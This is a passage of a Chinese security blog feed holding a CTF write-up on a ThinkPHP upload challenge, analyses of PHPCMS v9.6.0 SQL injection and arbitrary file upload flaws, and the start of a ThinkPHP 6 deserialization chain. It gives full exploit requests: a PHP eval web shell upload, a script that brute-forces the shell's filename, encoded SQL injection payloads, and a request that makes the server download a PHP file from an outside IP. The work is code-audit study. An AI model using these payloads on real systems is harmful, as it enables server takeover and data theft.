class="hljs-title">Controller</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        show_source(<span class="hljs-keyword">__FILE__</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        $uploadFile = $_FILES[<span class="hljs-string">'file'</span>] ;                <span class="hljs-keyword">if</span> (strstr(strtolower($uploadFile[<span class="hljs-string">'name'</span>]), <span class="hljs-string">".php"</span>) ) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        &#125;                $upload = <span class="hljs-keyword">new</span> \Think\Upload();<span class="hljs-comment">// 实例化上传类</span>        $upload-&gt;maxSize  = <span class="hljs-number">4096</span> ;<span class="hljs-comment">// 设置附件上传大小</span>        $upload-&gt;allowExts  = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>, <span class="hljs-string">'gif'</span>, <span class="hljs-string">'png'</span>, <span class="hljs-string">'jpeg'</span>);<span class="hljs-comment">// 设置附件上传类型</span>        $upload-&gt;rootPath = <span class="hljs-string">'./Public/Uploads/'</span>;<span class="hljs-comment">// 设置附件上传目录</span>        $upload-&gt;savePath = <span class="hljs-string">''</span>;<span class="hljs-comment">// 设置附件上传子目录</span>        $info = $upload-&gt;upload() ;        <span class="hljs-keyword">if</span>(!$info) &#123;<span class="hljs-comment">// 上传错误提示错误信息</span>          <span class="hljs-keyword">$this</span>-&gt;error($upload-&gt;getError());          <span class="hljs-keyword">return</span>;        &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">// 上传成功 获取上传文件信息</span>          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="hljs-number">1</span>).$info[<span class="hljs-string">'file'</span>][<span class="hljs-string">'savepath'</span>].$info[<span class="hljs-string">'file'</span>][<span class="hljs-string">'savename'</span>] ;          <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">"url"</span>=&gt;$url,<span class="hljs-string">"success"</span>=&gt;<span class="hljs-number">1</span>));        &#125;    &#125;&#125;</code></pre><p>上传三个文件缩小时间爆破范围</p><p><code>strstr</code>传入数组<code>warning</code>报错，回显<code>false</code></p><p><img src="./1571108312495.png" srcset="/img/loading.gif" alt="1571108312495"></p><p><code>$files</code>为空直接赋值$_FILES变量,<strong>关键处</strong></p><p><img src="./1571109934502.png" srcset="/img/loading.gif" alt="1571109934502"></p><p>再处理$files数组，遍历键值对，解放<code>$files</code>二维数组为一维数组</p><p><img src="./1571111012921.png" srcset="/img/loading.gif" alt="1571111012921"></p><p>调用配置文件中保存文件处理函数,<strong>uniqid函数</strong></p><p><img src="./1571110449119.png" srcset="/img/loading.gif" alt="1571110449119"></p><p><code>call_user_func_arrary</code> 调用<code>uniqid()</code>,生成文件名。</p><p><img src="./1571110604190.png" srcset="/img/loading.gif" alt="1571110604190"></p><p>保存文件</p><p><img src="./1571111166570.png" srcset="/img/loading.gif" alt="1571111166570"></p><h2 id="uniqid函数"><a href="#uniqid函数" class="headerlink" title="uniqid函数"></a>uniqid函数</h2><p><img src="./1571202207913.png" srcset="/img/loading.gif" alt="1571202207913"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>同时上传两个个文件，缩小爆破范围，远程可以上传三个文件更进一步缩小范围</p><p>本地显示爆破后３位就可以，远程需要后5位</p><p><img src="./1571109567467.png" srcset="/img/loading.gif" alt="1571109567467"></p><h2 id="文件上传exp"><a href="#文件上传exp" class="headerlink" title="文件上传exp"></a>文件上传exp</h2><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?m=home&amp;c=index&amp;a=upload</span> HTTP/1.1<span class="hljs-attribute">Host</span>: umgmalytroarctf.4hou.com.cn:32901<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------9130902641497288610839855586<span class="hljs-attribute">Content-Length</span>: 387<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1-----------------------------9130902641497288610839855586<span class="hljs-attribute">Content-Disposition</span>: form-data; name="file"; filename="as.txt"<span class="hljs-attribute">Content-Type</span>: text/plain&lt;?php phpinfo(); eval($_GET[_]); ?&gt;-----------------------------9130902641497288610839855586<span class="hljs-attribute">Content-Disposition</span>: form-data; name[1]="file"; filename="as.php"<span class="hljs-attribute">Content-Type</span>: text/plain&lt;?php phpinfo(); eval($_GET[_]); ?&gt;<span class="hljs-attribute">Content-Disposition</span>: form-data; name="file"; filename="as.txt"<span class="hljs-attribute">Content-Type</span>: text/plain&lt;?php phpinfo(); eval($_GET[_]); ?&gt;-----------------------------9130902641497288610839855586<span class="hljs-attribute">Content-Disposition</span>: form-data; name="submit"<span class="hljs-attribute">upload</span><span class="hljs-attribute">-----------------------------9130902641497288610839855586--</span></code></pre><h2 id="后缀爆破"><a href="#后缀爆破" class="headerlink" title="后缀爆破"></a>后缀爆破</h2><p>实在是太慢了，buuoj对多线程限制，就不爆了。</p><pre><code class="hljs awk">import requestsa=<span class="hljs-string">''</span><span class="hljs-comment"># for i in range(0x100,0xfff):</span><span class="hljs-comment">#     url = "http://51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82/Public/Uploads/2019-10-15/5da5495e5d"+hex(i)[2:]+'.php'</span><span class="hljs-comment">#     rep = requests.get(url)</span><span class="hljs-comment">#     print(hex(i)[2:])</span><span class="hljs-comment">#     if 'Version' in rep.text:</span><span class="hljs-comment">#         print(url)</span><span class="hljs-comment">#         a+=url</span><span class="hljs-comment">#         sys.exit()</span><span class="hljs-comment">#         break</span>        <span class="hljs-comment"># for i in range(0x1000,0xffff):</span><span class="hljs-comment">#     url = "http://51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82/Public/Uploads/2019-10-15/5da5495e5"+hex(i)[2:]+'.php'</span><span class="hljs-comment">#     rep = requests.get(url)</span><span class="hljs-comment">#     print(hex(i)[2:])</span><span class="hljs-comment">#     if 'Version' in rep.text:</span><span class="hljs-comment">#         print(url)</span><span class="hljs-comment">#         a+=url</span><span class="hljs-comment">#         sys.exit()</span><span class="hljs-comment">#         break</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>x6cd19,<span class="hljs-number">0</span>xfffff):    url = <span class="hljs-string">"http://51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82/Public/Uploads/2019-10-15/5da5583e"</span>+hex(i)[<span class="hljs-number">2</span>:]+<span class="hljs-string">'.php'</span>    rep = requests.get(url)    print(hex(i)[<span class="hljs-number">2</span>:])    <span class="hljs-keyword">if</span> <span class="hljs-string">'Version'</span> <span class="hljs-keyword">in</span> rep.text:        print(url)        a+=url        sys.<span class="hljs-keyword">exit</span>()        <span class="hljs-keyword">break</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>xe6cd19,<span class="hljs-number">0</span>xffffff):    url = <span class="hljs-string">"http://51da9aa4-dbbf-495c-9eb4-00ffb16bde78.node2.buuoj.cn.wetolink.com:82/Public/Uploads/2019-10-15/5da5583"</span>+hex(i)[<span class="hljs-number">2</span>:]+<span class="hljs-string">'.php'</span>    rep = requests.get(url)    print(hex(i)[<span class="hljs-number">2</span>:])    <span class="hljs-keyword">if</span> <span class="hljs-string">'Version'</span> <span class="hljs-keyword">in</span> rep.text:        print(url)        a+=url        sys.<span class="hljs-keyword">exit</span>()        <span class="hljs-keyword">break</span>print(a)</code></pre><h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><p><a href="https://mp.weixin.qq.com/s?srcid=1016GXIy2HOar4STCzN93JIO&amp;scene=23&amp;sharer_sharetime=1571181198903&amp;mid=2247483858&amp;sharer_shareid=fbbfc02e7625095a3404e2482b0c7a95&amp;sn=19234bf6611400ae9da5d9a49a233cde&amp;idx=1&amp;__biz=MzkwNzAwMDYyNQ%3D%3D&amp;chksm=c0deaf8cf7a9269a32d928617d0c3eb11720914c591e0dc4d017450b9ef3809f2ed6a348a1b8&amp;mpshare=1#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?srcid=1016GXIy2HOar4STCzN93JIO&amp;scene=23&amp;sharer_sharetime=1571181198903&amp;mid=2247483858&amp;sharer_shareid=fbbfc02e7625095a3404e2482b0c7a95&amp;sn=19234bf6611400ae9da5d9a49a233cde&amp;idx=1&amp;__biz=MzkwNzAwMDYyNQ%3D%3D&amp;chksm=c0deaf8cf7a9269a32d928617d0c3eb11720914c591e0dc4d017450b9ef3809f2ed6a348a1b8&amp;mpshare=1#rd</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>历史漏洞分析之PHPCMS v9.6.0 SQL注入</title>
    <link href="/2019/10/11/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/10/11/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>phpcms v9.6.0　sql注入漏洞</strong>分析下来很有趣，其中需要身份伪造,利用思路很像<a href="https://zhzhdoai.github.io/2019/03/08/Dedecms-cookie%E4%BC%AA%E9%80%A0%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%89%8D%E5%8F%B0%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/">Dedecms | cookie伪造导致任意前台用户登录</a>　</p><p>该漏洞提供给我们一个思路，<strong>身份认证相关方法如果使用不当能会导致垂直越权或者危险操作限制bypass，多发生在cookie生成</strong></p><p>为了具体分析，就不整合成一个系列。</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p><strong>sys_auth方法使用不当导致身份伪造，消毒操作存在绕过，parse_str存在变量覆盖和url解码</strong></p><h1 id="PHPcms-v9-6-0-SQL注入漏洞"><a href="#PHPcms-v9-6-0-SQL注入漏洞" class="headerlink" title="PHPcms v9.6.0 SQL注入漏洞"></a>PHPcms v9.6.0 SQL注入漏洞</h1><p>漏洞点：<strong>phpcms/modules/content/down.php</strong>  </p><p>$a_k参数可控，经过DECODE解密，秘钥是<code>pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;)</code>，不存在解密可能，可以<strong>考虑伪造!!!</strong><img src="./1.png" srcset="/img/loading.gif" alt="1570705232504"></p><p><code>$a_k</code>参数经过<code>parse_str</code>后会造成<strong>变量覆盖且存在解码url编码操作</strong>。可以使得<code>$id</code>参数覆盖为恶意值，带入<code>get_one</code>方法进行数据库查询，由于加密算法存在，无法直接构造注入语句，需要找到<code>sys_auth($可控,&#39;ENCODE&#39;)</code>将注入语句加密。</p><blockquote><p>全局搜索<code>sys_auth</code>方法，该方法可能会在其他位置调用要求<strong>加密值可控，相同秘钥，可输出</strong></p></blockquote><p><img src="./asdpng-1570783288478.png" srcset="/img/loading.gif" alt="asdpng"></p><p>满足以上条件只有一处，位于<strong>phpcms/libs/classes/param.class.php</strong>方法<code>set_cookie</code></p><p><img src="./1570782767714.png" srcset="/img/loading.gif" alt="1570782767714"></p><p>方法<code>set_cookie</code>不属于module控制类，需要全局搜索相应的调用。定位于<strong>phpcms/modules/attachment/attachments.php</strong>方法<code>swfupload_json</code>。这里参数都可控，<strong>利用src参数写入注入语句</strong></p><p><img src="./1570783589265.png" srcset="/img/loading.gif" alt="1570783589265"></p><p>但调用该方法存在限制，attachments类构造方法存在身份登录验证。需要伪造身份登录验证，全局搜索<code>param::get_cookie(&#39;_userid&#39;)</code>无果，可以尝试利用<strong>sys_auth($_POST[‘userid_flash’],’DECODE’))</strong></p><p>搜索思路: 只要伪造的<code>$_POST[&#39;userid_flash&#39;]</code>可以正常被解密就ok</p><p><img src="./1570783853112.png" srcset="/img/loading.gif" alt="1570783853112"></p><p>伪造利用点：<strong>phpcms/modules/wap/index.php方法__construct</strong></p><p>直接传入参数<code>siteid=1</code>，<code>set_cookie</code>方法实现加密并输出到界面</p><p><img src="./1570784208392.png" srcset="/img/loading.gif" alt="1570784208392"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><strong>phpcms/modules/attachments/attachments.php方法swupload_json</strong></p><p>需要注意的是<code>safe_replace</code>方法会对参数进行过滤</p><p><img src="./1570784400120.png" srcset="/img/loading.gif" alt="1570784400120"></p><h3 id="1-伪造身份登录"><a href="#1-伪造身份登录" class="headerlink" title="1. 伪造身份登录"></a>1. 伪造身份登录</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cms/phpcms_v9.6.0_GBK/install_package/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Cookie</span>: XDEBUG_SESSION=PHPSTORM;<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Pragma</span>: no-cache<span class="hljs-attribute">Cache-Control</span>: no-cache</code></pre><p><img src="./1570784458923.png" srcset="/img/loading.gif" alt="1570784458923"></p><h2 id="2-a-k参数伪造"><a href="#2-a-k参数伪造" class="headerlink" title="2. $a_k参数伪造"></a>2. $a_k参数伪造</h2><p>因为会对单引号过滤，添加<code>\</code>绕过</p><p><img src="./1570784586930.png" srcset="/img/loading.gif" alt="1570784586930"></p><p>post：userid_flash=3a3eDDxyeLyJiVa0OnxtRMTFT-dUiUJNyiFi5XuR</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/cms/phpcms_v9.6.0_GBK/install_package/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;filename=123&amp;src=%26m%3d1%26modelid%3d1%26catid%3d1%26f%3d1%26id%3d%2\7%20%61%6e%64%20%65%78%74%72%61%63%74%76%61%6c%75%65%28%31%2c%63%6f%6e%63%61%74%28%30%78%37%65%2c%64%61%74%61%62%61%73%65%28%29%2c%30%78%37%65%29%29%23</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Cookie</span>: XDEBUG_SESSION=PHPSTORM; <span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Pragma</span>: no-cache<span class="hljs-attribute">Cache-Control</span>: no-cache<span class="hljs-attribute">Content-Length</span>: 53<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencodeduserid_flash=3a3eDDxyeLyJiVa0OnxtRMTFT-dUiUJNyiFi5XuR</code></pre><p><img src="./1570784605136.png" srcset="/img/loading.gif" alt="1570784605136"></p><h2 id="3-SQL注入攻击"><a href="#3-SQL注入攻击" class="headerlink" title="3. SQL注入攻击"></a>3. SQL注入攻击</h2><p>将第二步生成的<code>Inuyg_att_json</code>赋值给<code>a_k</code></p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><pre><code class="hljs php">GET /cms/phpcms_v9<span class="hljs-number">.6</span><span class="hljs-number">.0</span>_GBK/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=<span class="hljs-number">4</span>c45OqkiGPU7JLh5_RVr1ExJNtQ136kir3IVKOi1uKmvUWYwSFJQNAKXSk_YGIZ3EEm9J6CPvaBICuy2BrmjQ6SDMNmByxFM2Kz8DOQUivEPKCRpFiVjM_Fh3El0iL1wjmb3t04vlxirpLGx0hteTNxK4W3vCLvBAW62EJLjl5WF8hLOkcoDdoUMqvyQDuLlVNXR HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux x86_64; rv:<span class="hljs-number">69.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">69.0</span>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*<span class="hljs-comment">/*;q=0.8</span><span class="hljs-comment">Accept-Language: en-US,en;q=0.5</span><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><span class="hljs-comment">DNT: 1</span><span class="hljs-comment">Connection: close</span><span class="hljs-comment">Cookie: XDEBUG_SESSION=PHPSTORM; </span><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><span class="hljs-comment">Pragma: no-cache</span><span class="hljs-comment">Cache-Control: no-cache</span></code></pre><p><img src="./1570784726909.png" srcset="/img/loading.gif" alt="1570784726909"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ol><li>限制<code>$id</code>参数只能为整型</li><li>拼接新key值</li></ol><p><img src="./1570800360392.png" srcset="/img/loading.gif" alt="1570800360392"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>历史漏洞分析之PHPCMS v9.6.0 任意文件上传</title>
    <link href="/2019/10/10/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2019/10/10/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>传统的cms直接定位危险函数就能快速审计出利用链，然而现代的cms都需要一大特性是动态函数执行，而且漏洞点时常会藏的很深，比如该cms的文件上传。如果单纯搜索<code>move_uploaded_file</code>函数是无果的，该漏洞主要是利用动态函数执行+远程文件下载。等自己认真审计一套传统cms，得需要深入研究现代cms挖掘的一些技巧，最近CNVD爆了个<strong>phpcms v9.6.3</strong>文件上传漏洞，挖了好久都没get到漏洞点。还是需要努力，更需耐心。</p><h1 id="程序流程分析"><a href="#程序流程分析" class="headerlink" title="程序流程分析"></a>程序流程分析</h1><p><code>$initialize = 1</code>则会初始化加载类</p><p><img src="./1570507844460.png" srcset="/img/loading.gif" alt="1570507844460"></p><p>调用<code>load_sys_class</code>可以调用并初始化类</p><p><img src="./1570507941227.png" srcset="/img/loading.gif" alt="1570507941227"></p><p>my_path拼接加载类文件路径</p><p><img src="./1570508003112.png" srcset="/img/loading.gif" alt="1570508003112"></p><p><code>application</code>类初始化应用，<code>param</code>类加载配置文件和过滤参数</p><p><img src="./1570508117947.png" srcset="/img/loading.gif" alt="1570508117947"></p><p>路由解析</p><p>分别定义三个宏变量</p><p><img src="./1570508215928.png" srcset="/img/loading.gif" alt="1570508215928"></p><p>获取模型</p><p><img src="./1570508153445.png" srcset="/img/loading.gif" alt="1570508153445"></p><p>获取控制器</p><p><img src="./1570508262507.png" srcset="/img/loading.gif" alt="1570508262507"></p><p>获取事件</p><p><img src="./1570508282085.png" srcset="/img/loading.gif" alt="1570508282085"></p><h2 id="路由解析后开始调用"><a href="#路由解析后开始调用" class="headerlink" title="路由解析后开始调用"></a>路由解析后开始调用</h2><p><img src="./1570508323389.png" srcset="/img/loading.gif" alt="1570508323389"></p><p>文件路径调用</p><p><code>$filepath=/var/www/html/cms/phpcms960/install_package/phpcms/modules/member/index.php</code></p><p>类调用： $classname = $filename </p><p><img src="./1570508469445.png" srcset="/img/loading.gif" alt="1570508469445"></p><h1 id="漏洞分析断点下放位置"><a href="#漏洞分析断点下放位置" class="headerlink" title="漏洞分析断点下放位置"></a>漏洞分析断点下放位置</h1><p>通过以上分析，下断点在<strong>application.class.php</strong>中类<code>application init()</code>方法</p><p>或者直接可以起到<code>call_user_func</code>位置</p><p><img src="./1570509646308.png" srcset="/img/loading.gif" alt="1570509646308"></p><h1 id="PHPcms-v9-6-0-任意文件上传漏洞"><a href="#PHPcms-v9-6-0-任意文件上传漏洞" class="headerlink" title="PHPcms v9.6.0 任意文件上传漏洞"></a>PHPcms v9.6.0 任意文件上传漏洞</h1><p>漏洞触发点(/phpcms/modules/member/index.php第135行)<code>$_POST[&#39;info&#39;]</code>参数可控.</p><p><code>get</code>方法由<code>member_input</code>类调用</p><p><img src="./1570533725731.png" srcset="/img/loading.gif" alt="1570533725731"></p><p>第48行执行动态函数调用</p><pre><code class="hljs php">$func参数：$func = <span class="hljs-keyword">$this</span>-&gt;fields[$field][<span class="hljs-string">'formtype'</span>];</code></pre><p><img src="./1570534911886.png" srcset="/img/loading.gif" alt="1570534911886"></p><h2 id="func参数"><a href="#func参数" class="headerlink" title="$func参数"></a>$func参数</h2><p>溯源<code>fields[$field][&#39;formtype&#39;];</code>，由类初始化时候对传入的$modelid值决定调用相应的文件内容。该值由$_POST[‘modelid’]传入可控.</p><p><img src="./1570534392605.png" srcset="/img/loading.gif" alt="1570534392605"></p><p><img src="./1570534237609.png" srcset="/img/loading.gif" alt="1570534237609"></p><p>可以调用的文件如下。<code>$func</code>值为相应调用方法.可以全局搜索<strong>formtype键</strong>对应的方法查看危险函数。</p><p><img src="./1570534752825.png" srcset="/img/loading.gif" alt="1570534752825"></p><p>跟进<strong>memeber_input.class.php下第59行</strong>editor方法，继续跟进<code>download方法</code></p><p><img src="./1570534977267.png" srcset="/img/loading.gif" alt="1570534977267"></p><p>第172行调用<code>$upload_func($file, $newfile)</code> ，$upload_func=”copy”，该方法会实现远程文件下载。</p><p>正则会截取包括<code>.$ext</code>内容</p><pre><code class="hljs lsl"><span class="hljs-string">"/(href|src)=([<span class="hljs-subst">\"</span>|']?)([^ <span class="hljs-subst">\"</span>'&gt;]+\.($ext))<span class="hljs-subst">\\</span>2/i"</span></code></pre><p><img src="./1570535230949.png" srcset="/img/loading.gif" alt="1570535230949"></p><p><strong>fillurl方法</strong>调用<code>strpos</code>对锚点前字符截取，可以利用<code>#</code>绕过正则对后缀的限制。保存的文件后缀就会置为php</p><p>构造<code>&lt;img href=http://120.77.180.97/1.php#.jpg&gt;</code>即可</p><p><img src="./1570535688224.png" srcset="/img/loading.gif" alt="1570535688224"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>每次请求需要更换<strong>username、password、email</strong></p><pre><code class="hljs php">POST /cms/phpcms_v9<span class="hljs-number">.6</span><span class="hljs-number">.0</span>_GBK/install_package/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux x86_64; rv:<span class="hljs-number">69.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">69.0</span>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*<span class="hljs-comment">/*;q=0.8</span><span class="hljs-comment">Accept-Language: en-US,en;q=0.5</span><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><span class="hljs-comment">DNT: 1</span><span class="hljs-comment">Connection: close</span><span class="hljs-comment">Cookie: Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1568982421; Hm_lvt_b60316de6009d5654de7312f772162be=1570084808; PHPSESSID=4bkbgc11d7qrgnd4ngjsmqc2b1; XDEBUG_SESSION=PHPSTORM</span><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><span class="hljs-comment">Content-Length: 147</span><span class="hljs-comment"></span><span class="hljs-comment">modelid=1&amp;info[content]=&lt;img href=http://120.77.180.97/1.php#.jpg&gt;&amp;dosubmit=1&amp;username=asdaasdsdasd&amp;password=asasdasddasd&amp;email=aasasddsdasd<span class="hljs-doctag">@qq</span>.com</span></code></pre><p><img src="./1570533447450.png" srcset="/img/loading.gif" alt="1570533447450"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>phpcms 9.6.3修复手段。进行一次后缀名验证</p><p><img src="./1570629159183.png" srcset="/img/loading.gif" alt="1570629159183"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP 6.0.x反序列化</title>
    <link href="/2019/10/02/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2019/10/02/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续补坑</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><pre><code class="hljs bash"><span class="hljs-comment"># 安装</span>composer create-project topthink/think=6.0.x-dev v6.0<span class="hljs-comment"># 开启</span><span class="hljs-built_in">cd</span> /v6.0php think run</code></pre><p><strong>/app/controller/index.php</strong></p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controller</span>;</span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span></span><span class="php">&#123;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">($input=<span class="hljs-string">''</span>)</span></span></span><span class="php">    &#123;   </span><span class="php">        <span class="hljs-keyword">echo</span> $input;</span><span class="php">        unserialize($input);   </span><span class="php">    &#125;</span><span class="php">&#125;</span></code></pre><p><img src="./1570002151171.png" srcset="/img/loading.gif" alt="1570002151171"></p><h2 id="toString魔术方法触发情况"><a href="#toString魔术方法触发情况" class="headerlink" title="__toString魔术方法触发情况"></a>__toString魔术方法触发情况</h2><p>摘自p神知识星球<br><img src="./1570005279576.png" srcset="/img/loading.gif" alt="1570005279576"></p><h1 id="pop链分析"><a href="#pop链分析" class="headerlink" title="pop链分析"></a>pop链分析</h1><p>pop调用起点为Model类<code>__destruct</code>魔术方法,<code>lazySave</code>为类变量置为true，调用save方法</p><p><img src="./1570004201577.png" srcset="/img/loading.gif" alt="1570004201577"></p><p>跟进<code>save</code>方法，接下来就是对这些方法瞎点点，看有没有合适的跳板。</p><p><img src="./1570004296164.png" srcset="/img/loading.gif" 